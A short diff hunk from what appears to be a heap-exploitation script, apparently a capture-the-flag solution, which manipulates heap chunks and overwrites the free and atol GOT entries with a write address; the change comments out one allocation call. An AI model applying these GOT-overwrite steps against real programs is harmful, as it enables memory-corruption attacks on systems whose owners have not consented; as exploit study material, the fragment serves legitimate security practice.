@@ -60,7 +60,7 @@ delete(1)
 edit(1, p64(chunk_ptr))
 create(0x80)
 create(0x80)
-create(0x90)
+# create(0x90)
 
 edit(1, p64(free_got)+p64(atol_got))
 edit(0, p64(write_adr))
